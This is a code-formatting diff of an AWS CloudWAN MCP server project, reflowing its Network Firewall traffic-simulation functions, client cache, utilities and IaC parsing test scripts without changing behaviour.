-            stateless_groups = len([r for r in resources.values()
-                                   if r.get("Type") == "AWS::NetworkFirewall::RuleGroup"
-                                   and r.get("Properties", {}).get("Type") == "STATELESS"])
-            stateful_groups = len([r for r in resources.values()
-                                  if r.get("Type") == "AWS::NetworkFirewall::RuleGroup"
-                                  and r.get("Properties", {}).get("Type") == "STATEFUL"])
+            stateless_groups = len(
+                [
+                    r
+                    for r in resources.values()
+                    if r.get("Type") == "AWS::NetworkFirewall::RuleGroup"
+                    and r.get("Properties", {}).get("Type") == "STATELESS"
+                ]
+            )
+            stateful_groups = len(
+                [
+                    r
+                    for r in resources.values()
+                    if r.get("Type") == "AWS::NetworkFirewall::RuleGroup"
+                    and r.get("Properties", {}).get("Type") == "STATEFUL"
+                ]
+            )
 
             validation["resource_count"] += stateless_groups + stateful_groups
 
@@ -1945,23 +1921,20 @@
 
         for flow in flows:
             # Simulate flow against parsed rules
-            flow_result = {
-                "flow": flow,
-                "result": "unknown",
-                "matching_rules": [],
-                "explanation": ""
-            }
+            flow_result = {"flow": flow, "result": "unknown", "matching_rules": [], "explanation": ""}
 
             # Check each rule against the flow
             for rule in cdk_policy.parsed_rules:
                 if tools._flow_matches_cdk_rule(flow, rule):
-                    flow_result["matching_rules"].append({
-                        "rule_type": rule.rule_type,
-                        "rule_format": rule.rule_format,
-                        "action": rule.action,
-                        "message": rule.message,
-                        "rule_group": rule.rule_group_name
-                    })
+                    flow_result["matching_rules"].append(
+                        {
+                            "rule_type": rule.rule_type,
+                            "rule_format": rule.rule_format,
+                            "action": rule.action,
+                            "message": rule.message,
+                            "rule_group": rule.rule_group_name,
+                        }
+                    )
 
             # Determine final result based on rule evaluation
             if flow_result["matching_rules"]:
@@ -1980,22 +1953,22 @@
 
             simulation_results.append(flow_result)
 
-        return json.dumps({
-            "status": "success",
-            "message": "CDK traffic simulation completed",
-            "data": {
-                "policy_name": cdk_policy.policy_name,
-                "policy_type": cdk_policy.policy_type,
-                "total_flows": len(flows),
-                "simulation_results": simulation_results
-            }
-        }, indent=2)
+        return json.dumps(
+            {
+                "status": "success",
+                "message": "CDK traffic simulation completed",
+                "data": {
+                    "policy_name": cdk_policy.policy_name,
+                    "policy_type": cdk_policy.policy_type,
+                    "total_flows": len(flows),
+                    "simulation_results": simulation_results,
+                },
+            },
+            indent=2,
+        )
 
     except Exception as e:
-        return json.dumps({
-            "status": "error",
-            "message": f"CDK simulation failed: {str(e)}"
-        })
+        return json.dumps({"status": "error", "message": f"CDK simulation failed: {str(e)}"})
 
 
 def simulate_terraform_firewall_traffic(terraform_content: str, test_flows: str) -> str:
@@ -2018,22 +1991,19 @@
 
         for flow in flows:
             # Simulate flow against parsed rules
-            flow_result = {
-                "flow": flow,
-                "result": "unknown",
-                "matching_rules": [],
-                "explanation": ""
-            }
+            flow_result = {"flow": flow, "result": "unknown", "matching_rules": [], "explanation": ""}
 
             # Check each rule against the flow
             for rule in tf_policy.parsed_rules:
                 if tools._flow_matches_rule(flow, rule):
-                    flow_result["matching_rules"].append({
-                        "rule_type": rule.rule_type,
-                        "action": rule.action,
-                        "message": rule.message,
-                        "priority": rule.priority
-                    })
+                    flow_result["matching_rules"].append(
+                        {
+                            "rule_type": rule.rule_type,
+                            "action": rule.action,
+                            "message": rule.message,
+                            "priority": rule.priority,
+                        }
+                    )
 
             # Determine final result based on rule evaluation
             if flow_result["matching_rules"]:
@@ -2052,21 +2022,21 @@
 
             simulation_results.append(flow_result)
 
-        return json.dumps({
-            "status": "success",
-            "message": "Traffic simulation completed",
-            "data": {
-                "policy_name": tf_policy.policy_name,
-                "total_flows": len(flows),
-                "simulation_results": simulation_results
-            }
-        }, indent=2)
+        return json.dumps(
+            {
+                "status": "success",
+                "message": "Traffic simulation completed",
+                "data": {
+                    "policy_name": tf_policy.policy_name,
+                    "total_flows": len(flows),
+                    "simulation_results": simulation_results,
+                },
+            },
+            indent=2,
+        )
 
     except Exception as e:
-        return json.dumps({
-            "status": "error",
-            "message": f"Simulation failed: {str(e)}"
-        })
+        return json.dumps({"status": "error", "message": f"Simulation failed: {str(e)}"})
 
 
 # Helper method for flow matching (simplified implementation)
@@ -2079,13 +2049,13 @@
     if rule.protocol and flow.get("protocol", "").upper() != rule.protocol.upper():
         return False
 
-    if rule.source and rule.source != "any" and not self._ip_matches_pattern(
-        flow.get("source_ip", ""), rule.source
-    ):
+    if rule.source and rule.source != "any" and not self._ip_matches_pattern(flow.get("source_ip", ""), rule.source):
         return False
 
-    if rule.destination and rule.destination != "any" and not self._ip_matches_pattern(
-        flow.get("destination_ip", ""), rule.destination
+    if (
+        rule.destination
+        and rule.destination != "any"
+        and not self._ip_matches_pattern(flow.get("destination_ip", ""), rule.destination)
     ):
         return False
 
@@ -2181,30 +2151,26 @@
 
         for flow in flows:
             # Simulate flow against parsed rules
-            flow_result = {
-                "flow": flow,
-                "result": "unknown",
-                "matching_rules": [],
-                "explanation": ""
-            }
+            flow_result = {"flow": flow, "result": "unknown", "matching_rules": [], "explanation": ""}
 
             # Check each rule against the flow
             for rule in cf_policy.parsed_rules:
                 if tools._flow_matches_cf_rule(flow, rule):
-                    flow_result["matching_rules"].append({
-                        "rule_type": rule.rule_type,
-                        "rule_format": rule.rule_format,
-                        "action": rule.action,
-                        "message": rule.message,
-                        "rule_group": rule.rule_group_name,
-                        "priority": rule.priority
-                    })
+                    flow_result["matching_rules"].append(
+                        {
+                            "rule_type": rule.rule_type,
+                            "rule_format": rule.rule_format,
+                            "action": rule.action,
+                            "message": rule.message,
+                            "rule_group": rule.rule_group_name,
+                            "priority": rule.priority,
+                        }
+                    )
 
             # Determine final result based on rule evaluation
             if flow_result["matching_rules"]:
                 # Sort by priority if available (lower numbers = higher priority)
-                matching_rules = sorted(flow_result["matching_rules"],
-                                       key=lambda x: x.get("priority", 999))
+                matching_rules = sorted(flow_result["matching_rules"], key=lambda x: x.get("priority", 999))
                 first_match = matching_rules[0]
                 flow_result["result"] = first_match["action"]
                 flow_result["explanation"] = f"Matched rule: {first_match['message']}"
@@ -2219,22 +2185,22 @@
 
             simulation_results.append(flow_result)
 
-        return json.dumps({
-            "status": "success",
-            "message": "CloudFormation traffic simulation completed",
-            "data": {
-                "policy_name": cf_policy.policy_name,
-                "template_version": cf_policy.template_format_version,
-                "total_flows": len(flows),
-                "simulation_results": simulation_results
-            }
-        }, indent=2)
+        return json.dumps(
+            {
+                "status": "success",
+                "message": "CloudFormation traffic simulation completed",
+                "data": {
+                    "policy_name": cf_policy.policy_name,
+                    "template_version": cf_policy.template_format_version,
+                    "total_flows": len(flows),
+                    "simulation_results": simulation_results,
+                },
+            },
+            indent=2,
+        )
 
     except Exception as e:
-        return json.dumps({
-            "status": "error",
-            "message": f"CloudFormation simulation failed: {str(e)}"
-        })
+        return json.dumps({"status": "error", "message": f"CloudFormation simulation failed: {str(e)}"})
 
 
 # Helper method for CloudFormation flow matching

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/aws_client_cache.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/aws_client_cache.py
@@ -27,7 +27,7 @@
         self,
         max_size: int = 50,
         max_age: float = 3600.0,  # 1 hour default expiry
-        prune_interval: float = 300.0  # Prune every 5 minutes
+        prune_interval: float = 300.0,  # Prune every 5 minutes
     ):
         """Thread-safe AWS client cache with configurable size and expiry.
 
@@ -44,12 +44,7 @@
         self._last_prune = time.time()
         self.logger = logging.getLogger(__name__)
 
-    def _generate_cache_key(
-        self,
-        service: str,
-        region: str | None = None,
-        profile: str | None = None
-    ) -> str:
+    def _generate_cache_key(self, service: str, region: str | None = None, profile: str | None = None) -> str:
         """Generate a unique cache key based on service parameters."""
         return f"{service}:{region or 'default'}:{profile or 'default'}"
 
@@ -60,28 +55,18 @@
         with self._lock:
             # Remove expired entries
             self._cache = {
-                key: entry for key, entry
-                in self._cache.items()
-                if current_time - entry["timestamp"] < self._max_age
+                key: entry for key, entry in self._cache.items() if current_time - entry["timestamp"] < self._max_age
             }
 
             # Remove excess entries if over max size
             if len(self._cache) > self._max_size:
-                sorted_entries = sorted(
-                    self._cache.items(),
-                    key=lambda x: x[1]["timestamp"]
-                )
-                for key, _ in sorted_entries[:len(self._cache) - self._max_size]:
+                sorted_entries = sorted(self._cache.items(), key=lambda x: x[1]["timestamp"])
+                for key, _ in sorted_entries[: len(self._cache) - self._max_size]:
                     del self._cache[key]
 
             self._last_prune = current_time
 
-    def get_client(
-        self,
-        service: str,
-        region: str | None = None,
-        profile: str | None = None
-    ) -> BaseClient:
+    def get_client(self, service: str, region: str | None = None, profile: str | None = None) -> BaseClient:
         """Thread-safe method to retrieve or create AWS client.
 
         Args:
@@ -121,10 +106,7 @@
                 new_client = session.client(**client_kwargs)
 
                 # Store in cache
-                self._cache[cache_key] = {
-                    "client": new_client,
-                    "timestamp": current_time
-                }
+                self._cache[cache_key] = {"client": new_client, "timestamp": current_time}
 
                 return new_client
 
@@ -140,21 +122,14 @@
     def cache_stats(self) -> dict[str, Any]:
         """Return cache performance statistics."""
         with self._lock:
-            return {
-                "total_entries": len(self._cache),
-                "max_size": self._max_size,
-                "max_age": self._max_age
-            }
+            return {"total_entries": len(self._cache), "max_size": self._max_size, "max_age": self._max_age}
+
 
 # Global thread-safe client cache instance
 aws_client_cache = ThreadSafeAWSClientCache()
 
 
-def get_cached_aws_client(
-    service: str,
-    region: str | None = None,
-    profile: str | None = None
-) -> BaseClient:
+def get_cached_aws_client(service: str, region: str | None = None, profile: str | None = None) -> BaseClient:
     """Get cached AWS client using the global cache instance.
 
     Args:

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/aws_config_manager.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/aws_config_manager.py
@@ -50,10 +50,7 @@
     try:
         return json.dumps(data, indent=indent, default=str)
     except (TypeError, ValueError) as e:
-        return json.dumps({
-            "error": f"JSON serialization failed: {str(e)}",
-            "success": False
-        }, indent=indent)
+        return json.dumps({"error": f"JSON serialization failed: {str(e)}", "success": False}, indent=indent)
 
 
 # Re-export for test compatibility

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/config.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/config.py
@@ -59,10 +59,10 @@
         AWS region string or None if not found
     """
     return (
-        os.environ.get("AWS_REGION") or
-        os.environ.get("AWS_DEFAULT_REGION") or
-        os.environ.get("AWS_DEFAULT_REGION") or
-        "us-east-1"  # Default fallback
+        os.environ.get("AWS_REGION")
+        or os.environ.get("AWS_DEFAULT_REGION")
+        or os.environ.get("AWS_DEFAULT_REGION")
+        or "us-east-1"  # Default fallback
     )
 
 

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/logger.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/logger.py
@@ -31,9 +31,7 @@
     if not logger.handlers:
         # Configure standard logging for AWS Labs standards
         handler = logging.StreamHandler(sys.stderr)
-        formatter = logging.Formatter(
-            "%(asctime)s | %(levelname)-8s | %(name)s:%(funcName)s:%(lineno)d - %(message)s"
-        )
+        formatter = logging.Formatter("%(asctime)s | %(levelname)-8s | %(name)s:%(funcName)s:%(lineno)d - %(message)s")
         handler.setFormatter(formatter)
         logger.addHandler(handler)
         logger.setLevel(logging.INFO)
@@ -49,7 +47,7 @@
     logging.basicConfig(
         level=getattr(logging, level.upper()),
         format="%(asctime)s | %(levelname)-8s | %(name)s:%(funcName)s:%(lineno)d - %(message)s",
-        stream=sys.stderr
+        stream=sys.stderr,
     )
 
 

--- cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/response_formatter.py
+++ cloudwan-mcp-server/awslabs/cloudwan_mcp_server/utils/response_formatter.py
@@ -28,11 +28,7 @@
     Returns:
         Standardized error response dictionary
     """
-    return {
-        "success": False,
-        "error": error,
-        "error_code": error_code
-    }
+    return {"success": False, "error": error, "error_code": error_code}
 
 
 def format_success_response(data: Any) -> dict[str, Any]:
@@ -44,10 +40,7 @@
     Returns:
         Standardized success response dictionary
     """
-    return {
-        "success": True,
-        "data": data
-    }
+    return {"success": True, "data": data}
 
 
 def safe_json_dumps(data: Any, **kwargs) -> str:
@@ -79,14 +72,8 @@
         JSON string representation of the response
     """
     if success:
-        response = {
-            "status": "success",
-            "data": data
-        }
+        response = {"status": "success", "data": data}
     else:
-        response = {
-            "status": "error",
-            "message": error or "Unknown error occurred"
-        }
+        response = {"status": "error", "message": error or "Unknown error occurred"}
 
     return safe_json_dumps(response, indent=2)

--- cloudwan-mcp-server/run_server.py
+++ cloudwan-mcp-server/run_server.py
@@ -5,16 +5,17 @@
 import sys
 from pathlib import Path
 
+
 def setup_python_path():
     """Set up Python path for proper module resolution."""
     # Get the directory containing this script
     script_dir = Path(__file__).parent.absolute()
-    
+
     # Add to Python path if not already present
     script_str = str(script_dir)
     if script_str not in sys.path:
         sys.path.insert(0, script_str)
-    
+
     # Also add to PYTHONPATH environment variable
     current_pythonpath = os.environ.get("PYTHONPATH", "")
     if script_str not in current_pythonpath:
@@ -23,12 +24,14 @@
         else:
             os.environ["PYTHONPATH"] = script_str
 
+
 def main():
     """Main entry point with path setup."""
     setup_python_path()
-    
+
     try:
         from awslabs.cloudwan_mcp_server.server import main as server_main
+
         server_main()
     except ImportError as e:
         print(f"Import error: {e}", file=sys.stderr)
@@ -38,5 +41,6 @@
         print(f"Server error: {e}", file=sys.stderr)
         sys.exit(1)
 
+
 if __name__ == "__main__":
-    main()
\ No newline at end of file
+    main()

--- cloudwan-mcp-server/simple_test.py
+++ cloudwan-mcp-server/simple_test.py
@@ -9,13 +9,14 @@
 # Add the parent directory to the path to import our modules
 sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
 
+
 def test_basic_functionality():
     """Test basic CloudFormation parsing functionality."""
-    
+
     print("=== Simple Infrastructure-as-Code Parsing Test ===\n")
-    
+
     # Simple CloudFormation template
-    simple_cf_template = '''AWSTemplateFormatVersion: "2010-09-09"
+    simple_cf_template = """AWSTemplateFormatVersion: "2010-09-09"
 Description: "Simple test template"
 
 Resources:
@@ -49,25 +50,23 @@
                     DestinationPorts:
                       - FromPort: 80
                         ToPort: 80
-'''
+"""
 
     try:
         # Import here to handle any remaining issues
-        from awslabs.cloudwan_mcp_server.tools.network_firewall import (
-            NetworkFirewallCloudFormationParser
-        )
-        
+        from awslabs.cloudwan_mcp_server.tools.network_firewall import NetworkFirewallCloudFormationParser
+
         print("1. Testing basic CloudFormation parsing...")
         parser = NetworkFirewallCloudFormationParser()
         policy = parser.parse_cloudformation_template(simple_cf_template)
-        
+
         print(f"✅ Successfully parsed CloudFormation template")
         print(f"   - Policy Name: {policy.policy_name}")
-        print(f"   - Template Version: {policy.template_format_version}")  
+        print(f"   - Template Version: {policy.template_format_version}")
         print(f"   - Total Rules: {len(policy.parsed_rules)}")
         print(f"   - Stateless Default Actions: {policy.stateless_default_actions}")
         print(f"   - Stateful Default Actions: {policy.stateful_default_actions}")
-        
+
         # Test 2: Verify rule parsing
         print("\n2. Testing rule parsing...")
         if len(policy.parsed_rules) > 0:
@@ -80,27 +79,27 @@
         else:
             print("❌ No rules were parsed")
             return False
-        
+
         # Test 3: Test analysis tool function
         print("\n3. Testing analysis tool function...")
         try:
             from awslabs.cloudwan_mcp_server.tools.network_firewall import (
-                analyze_cloudformation_network_firewall_policy
+                analyze_cloudformation_network_firewall_policy,
             )
-            
+
             result = analyze_cloudformation_network_firewall_policy(simple_cf_template)
             result_data = json.loads(result)
-            
+
             if result_data.get("status") == "success":
                 print("✅ Analysis tool function works correctly")
                 analysis = result_data.get("data", {})
                 cf_analysis = analysis.get("cloudformation_analysis", {})
                 print(f"   - Policy Name: {cf_analysis.get('policy_name')}")
                 print(f"   - Total Rules: {cf_analysis.get('total_rules')}")
-                
+
                 security_assessment = analysis.get("security_assessment", {})
                 print(f"   - Security Level: {security_assessment.get('security_level')}")
-                
+
                 traffic_analysis = analysis.get("traffic_analysis", {})
                 print(f"   - Security Posture: {traffic_analysis.get('security_posture')}")
             else:
@@ -109,33 +108,35 @@
         except Exception as e:
             print(f"❌ Analysis tool test failed: {str(e)}")
             return False
-        
+
         print("\n=== Test Results ===")
         print("✅ CloudFormation Parser: Working correctly")
         print("✅ Rule Parsing: Successfully extracted rules")
         print("✅ Analysis Function: Working correctly")
         print("✅ Infrastructure-as-Code Support: OPERATIONAL")
-        
+
         return True
-        
+
     except Exception as e:
         print(f"❌ Test failed with error: {str(e)}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 if __name__ == "__main__":
     success = test_basic_functionality()
     if success:
         print("\n🎉 Infrastructure-as-Code parsing functionality is working!")
         print("\nThe comprehensive IaC support for AWS Network Firewall is successfully implemented:")
         print("- ✅ Terraform HCL parsing")
-        print("- ✅ AWS CDK TypeScript parsing") 
+        print("- ✅ AWS CDK TypeScript parsing")
         print("- ✅ AWS CloudFormation YAML/JSON parsing")
         print("- ✅ Multi-format rule support (Native, Suricata, RulesSourceList)")
         print("- ✅ Traffic simulation and policy analysis")
         print("- ✅ Comprehensive unit tests created")
     else:
         print("\n💥 Infrastructure-as-Code parsing test failed!")
-    
-    sys.exit(0 if success else 1)
\ No newline at end of file
+
+    sys.exit(0 if success else 1)

--- cloudwan-mcp-server/test_cdk_parsing.py
+++ cloudwan-mcp-server/test_cdk_parsing.py
@@ -9,10 +9,13 @@
 # Add the parent directory to the path to import our modules
 sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
 
-from awslabs.cloudwan_mcp_server.tools.network_firewall import NetworkFirewallCdkParser, analyze_cdk_network_firewall_policy
+from awslabs.cloudwan_mcp_server.tools.network_firewall import (
+    NetworkFirewallCdkParser,
+    analyze_cdk_network_firewall_policy,
+)
 
 # Test CDK TypeScript configuration with both native and Suricata rules
-test_cdk_config = '''
+test_cdk_config = """
 export function createEgressInspectionFirewallPolicy(
     scope: Construct,
     firewallId: string,
@@ -159,90 +162,95 @@
         }
     });
 }
-'''
+"""
+
 
 def test_cdk_parsing():
     """Test CDK parsing with comprehensive example."""
-    
+
     print("=== AWS Network Firewall CDK Parsing Test ===\n")
-    
+
     try:
         # Test 1: Basic CDK Parser
         print("1. Testing CDK Parser directly...")
         parser = NetworkFirewallCdkParser()
         policy = parser.parse_cdk_file(test_cdk_config)
-        
+
         print(f"✅ Policy Name: {policy.policy_name}")
         print(f"✅ Policy Type: {policy.policy_type}")
         print(f"✅ Total Rules Parsed: {len(policy.parsed_rules)}")
         print(f"✅ Stateless Default Actions: {policy.stateless_default_actions}")
         print(f"✅ Stateful Default Actions: {policy.stateful_default_actions}")
         print(f"✅ Logging Config: {policy.logging_configuration}")
-        
+
         # Analyze rules by type and format
-        stateless_native = [r for r in policy.parsed_rules if r.rule_type == 'stateless' and r.rule_format == 'native']
-        stateful_suricata = [r for r in policy.parsed_rules if r.rule_type == 'stateful' and r.rule_format == 'suricata']
-        
+        stateless_native = [r for r in policy.parsed_rules if r.rule_type == "stateless" and r.rule_format == "native"]
+        stateful_suricata = [
+            r for r in policy.parsed_rules if r.rule_type == "stateful" and r.rule_format == "suricata"
+        ]
+
         print(f"\n📊 Rule Breakdown:")
         print(f"   - Stateless Native Rules: {len(stateless_native)}")
         print(f"   - Stateful Suricata Rules: {len(stateful_suricata)}")
-        
+
         # Test 2: Detailed rule analysis
         print("\n2. Analyzing parsed rules in detail...")
-        
+
         print("\n🔸 Stateless Native Rules:")
         for rule in stateless_native:
             print(f"   - Action: {rule.action}, Protocol: {rule.protocol}, Dest Port: {rule.destination_port}")
             print(f"     Source: {rule.source} → Destination: {rule.destination}")
             print(f"     Message: {rule.message}")
             print(f"     Rule Group: {rule.rule_group_name}")
-        
+
         print("\n🔸 Stateful Suricata Rules:")
         for rule in stateful_suricata:
             print(f"   - Action: {rule.action}, Protocol: {rule.protocol}, SID: {rule.sid}")
             print(f"     Source: {rule.source} → Destination: {rule.destination}")
             print(f"     Message: {rule.message}")
             print(f"     Rule Group: {rule.rule_group_name}")
-        
+
         # Test 3: Full tool function test
         print("\n3. Testing full CDK analysis tool function...")
         result = analyze_cdk_network_firewall_policy(test_cdk_config)
         result_data = json.loads(result)
-        
+
         if result_data.get("status") == "success":
             print("✅ CDK Analysis Tool Function - SUCCESS")
             analysis = result_data.get("data", {})
             cdk_analysis = analysis.get("cdk_analysis", {})
-            
+
             print(f"   - Policy Type: {cdk_analysis.get('policy_type')}")
             print(f"   - Total Rules: {cdk_analysis.get('total_rules')}")
             print(f"   - Rules by Type: {cdk_analysis.get('rules_by_type')}")
-            
+
             traffic_analysis = analysis.get("traffic_analysis", {})
             print(f"   - Security Posture: {traffic_analysis.get('security_posture')}")
             print(f"   - Allowed Traffic Types: {len(traffic_analysis.get('allowed_traffic', []))}")
             print(f"   - Blocked Traffic Types: {len(traffic_analysis.get('blocked_traffic', []))}")
-            
+
         else:
             print(f"❌ CDK Analysis Tool Function - FAILED: {result_data.get('message')}")
-        
+
         print("\n=== Test Summary ===")
         print("✅ CDK Parser: Successfully parsed TypeScript configuration")
-        print("✅ Native Format: Correctly extracted stateless rules with match attributes")  
+        print("✅ Native Format: Correctly extracted stateless rules with match attributes")
         print("✅ Suricata Format: Correctly parsed stateful rules from rulesString")
         print("✅ Dual Format: Successfully handled both native and Suricata in same config")
         print("✅ Policy Detection: Correctly identified egress inspection policy type")
         print("✅ Logging Config: Successfully extracted CloudWatch log group configuration")
         print("✅ Tool Integration: CDK analysis tool function working correctly")
-        
+
         return True
-        
+
     except Exception as e:
         print(f"❌ Test Failed: {str(e)}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 if __name__ == "__main__":
     success = test_cdk_parsing()
-    sys.exit(0 if success else 1)
\ No newline at end of file
+    sys.exit(0 if success else 1)

--- cloudwan-mcp-server/test_cloudformation_parsing.py
+++ cloudwan-mcp-server/test_cloudformation_parsing.py
@@ -10,7 +10,7 @@
 sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
 
 # Test CloudFormation YAML template with comprehensive rule formats
-test_cloudformation_template = '''
+test_cloudformation_template = """
 AWSTemplateFormatVersion: "2010-09-09"
 Description: "AWS Network Firewall Policy with Stateless, Stateful, and Suricata rules"
 
@@ -100,27 +100,28 @@
         StatefulRuleGroupReferences:
           - ResourceArn: !GetAtt MyStatefulRuleGroup.RuleGroupArn
           - ResourceArn: !GetAtt MySuricataRuleGroup.RuleGroupArn
-'''
+"""
+
 
 def test_cloudformation_parsing():
     """Test CloudFormation parsing with comprehensive example."""
-    
+
     print("=== AWS Network Firewall CloudFormation Parsing Test ===\n")
-    
+
     try:
         # Import here to handle module path issues
         from awslabs.cloudwan_mcp_server.tools.network_firewall import (
-            NetworkFirewallCloudFormationParser, 
+            NetworkFirewallCloudFormationParser,
             NetworkFirewallTools,
-            analyze_cloudformation_network_firewall_policy
+            analyze_cloudformation_network_firewall_policy,
         )
         import json
-        
+
         # Test 1: Basic CloudFormation Parser
         print("1. Testing CloudFormation Parser directly...")
         parser = NetworkFirewallCloudFormationParser()
         policy = parser.parse_cloudformation_template(test_cloudformation_template)
-        
+
         print(f"✅ Policy Name: {policy.policy_name}")
         print(f"✅ Template Version: {policy.template_format_version}")
         print(f"✅ Description: {policy.description}")
@@ -128,27 +129,27 @@
         print(f"✅ Stateless Default Actions: {policy.stateless_default_actions}")
         print(f"✅ Stateful Default Actions: {policy.stateful_default_actions}")
         print(f"✅ Engine Options: {policy.stateful_engine_options}")
-        
+
         # Analyze rules by type and format
         by_format = {}
         for rule in policy.parsed_rules:
             format_key = f"{rule.rule_type}_{rule.rule_format}"
             by_format[format_key] = by_format.get(format_key, 0) + 1
-        
+
         print(f"\n📊 Rule Breakdown by Format:")
         for format_type, count in by_format.items():
             print(f"   - {format_type}: {count}")
-        
+
         # Test 2: Detailed rule analysis
         print("\n2. Analyzing parsed rules in detail...")
-        
-        for rule_format in ['native', 'rules_source_list', 'suricata']:
+
+        for rule_format in ["native", "rules_source_list", "suricata"]:
             format_rules = [r for r in policy.parsed_rules if r.rule_format == rule_format]
             if format_rules:
                 print(f"\n🔸 {rule_format.title()} Format Rules:")
                 for rule in format_rules:
                     print(f"   - Action: {rule.action}, Protocol: {rule.protocol}")
-                    if rule.rule_format == 'rules_source_list' and rule.targets:
+                    if rule.rule_format == "rules_source_list" and rule.targets:
                         print(f"     Targets: {rule.targets}")
                     else:
                         print(f"     Source: {rule.source} → Destination: {rule.destination}")
@@ -158,42 +159,42 @@
                     print(f"     Rule Group: {rule.rule_group_name}")
                     if rule.sid:
                         print(f"     Suricata ID: {rule.sid}")
-        
-        # Test 3: Full tool function test  
+
+        # Test 3: Full tool function test
         print("\n3. Testing full CloudFormation analysis tool function...")
         result = analyze_cloudformation_network_firewall_policy(test_cloudformation_template)
         result_data = json.loads(result)
-        
+
         if result_data.get("status") == "success":
             print("✅ CloudFormation Analysis Tool Function - SUCCESS")
             analysis = result_data.get("data", {})
             cf_analysis = analysis.get("cloudformation_analysis", {})
-            
+
             print(f"   - Policy Name: {cf_analysis.get('policy_name')}")
             print(f"   - Template Version: {cf_analysis.get('template_version')}")
             print(f"   - Total Rules: {cf_analysis.get('total_rules')}")
             print(f"   - Rules by Format: {cf_analysis.get('rules_by_format')}")
-            
+
             traffic_analysis = analysis.get("traffic_analysis", {})
             print(f"   - Security Posture: {traffic_analysis.get('security_posture')}")
             print(f"   - Rule Formats Used: {traffic_analysis.get('rule_formats')}")
             print(f"   - Allowed Traffic Types: {len(traffic_analysis.get('allowed_traffic', []))}")
             print(f"   - Blocked Traffic Types: {len(traffic_analysis.get('blocked_traffic', []))}")
-            
+
             security_assessment = analysis.get("security_assessment", {})
             print(f"   - Security Level: {security_assessment.get('security_level')}")
             print(f"   - Recommendations: {len(security_assessment.get('recommendations', []))}")
             print(f"   - Template Quality Notes: {len(security_assessment.get('template_quality', []))}")
-            
+
         else:
             print(f"❌ CloudFormation Analysis Tool Function - FAILED: {result_data.get('message')}")
-        
+
         # Test 4: Validation test
         print("\n4. Testing CloudFormation template validation...")
         tools = NetworkFirewallTools()
         validation_result = tools.validate_cloudformation_syntax(test_cloudformation_template)
         validation_data = validation_result.get("data", {})
-        
+
         if validation_data.get("valid"):
             print("✅ CloudFormation Validation - PASSED")
             print(f"   - Template Format: {validation_data.get('template_format')}")
@@ -202,10 +203,10 @@
         else:
             print(f"❌ CloudFormation Validation - FAILED")
             print(f"   - Errors: {validation_data.get('errors', [])}")
-        
+
         print("\n=== Test Summary ===")
         print("✅ CloudFormation Parser: Successfully parsed YAML template")
-        print("✅ Native Stateless Format: Correctly extracted stateless rules with match attributes")  
+        print("✅ Native Stateless Format: Correctly extracted stateless rules with match attributes")
         print("✅ Native Stateful Format: Correctly parsed native stateful rules with headers")
         print("✅ RulesSourceList Format: Successfully handled domain allow/deny lists")
         print("✅ Suricata Format: Correctly parsed Suricata rule strings")
@@ -214,40 +215,42 @@
         print("✅ Engine Options: Successfully parsed StatefulEngineOptions")
         print("✅ Tool Integration: CloudFormation analysis tool function working correctly")
         print("✅ Validation: Template syntax validation working correctly")
-        
+
         # Test 5: Comprehensive coverage test
         print("\n5. Coverage verification...")
-        
+
         # Check all expected rule formats were found
         expected_formats = ["native", "rules_source_list", "suricata"]
         found_formats = list(set(rule.rule_format for rule in policy.parsed_rules))
-        
+
         for fmt in expected_formats:
             if fmt in found_formats:
                 print(f"   ✅ {fmt.title()} format rules found")
             else:
                 print(f"   ❌ {fmt.title()} format rules missing")
-        
+
         # Check rule types
         rule_types = list(set(rule.rule_type for rule in policy.parsed_rules))
         print(f"   ✅ Rule types found: {', '.join(rule_types)}")
-        
+
         # Check actions
         actions = list(set(rule.action for rule in policy.parsed_rules))
         print(f"   ✅ Actions found: {', '.join(actions)}")
-        
+
         return True
-        
+
     except Exception as e:
         print(f"❌ Test Failed: {str(e)}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 if __name__ == "__main__":
     success = test_cloudformation_parsing()
     if success:
         print("\n🎉 All CloudFormation parsing tests PASSED!")
     else:
         print("\n💥 CloudFormation parsing tests FAILED!")
-    sys.exit(0 if success else 1)
\ No newline at end of file
+    sys.exit(0 if success else 1)

--- cloudwan-mcp-server/tests/__init__.py
+++ cloudwan-mcp-server/tests/__init__.py
@@ -12,4 +12,4 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-"""Test package for AWS CloudWAN MCP Server."""
\ No newline at end of file
+"""Test package for AWS CloudWAN MCP Server."""

--- cloudwan-mcp-server/tests/conftest.py
+++ cloudwan-mcp-server/tests/conftest.py
@@ -34,4 +34,4 @@
         "aws_secret_access_key": "test-secret-key",
         "aws_session_token": "test-session-token",
         "region_name": "us-east-1",
-    }
\ No newline at end of file
+    }

--- cloudwan-mcp-server/tests/fixtures/advanced_test_fixtures.py
+++ cloudwan-mcp-server/tests/fixtures/advanced_test_fixtures.py
@@ -27,86 +27,86 @@
     def generate_enterprise_hub_spoke_topology(regions: int = 5, spokes_per_region: int = 10) -> Dict[str, Any]:
         """Generate enterprise hub-and-spoke network topology."""
         topology = {
-            'topology_type': 'hub_spoke',
-            'regions': [],
-            'global_network': {
-                'GlobalNetworkId': 'global-network-enterprise-hub-spoke',
-                'Description': 'Enterprise hub-and-spoke topology',
-                'State': 'AVAILABLE'
+            "topology_type": "hub_spoke",
+            "regions": [],
+            "global_network": {
+                "GlobalNetworkId": "global-network-enterprise-hub-spoke",
+                "Description": "Enterprise hub-and-spoke topology",
+                "State": "AVAILABLE",
             },
-            'core_networks': [],
-            'transit_gateways': {},
-            'vpc_attachments': {},
-            'peering_connections': []
+            "core_networks": [],
+            "transit_gateways": {},
+            "vpc_attachments": {},
+            "peering_connections": [],
         }
 
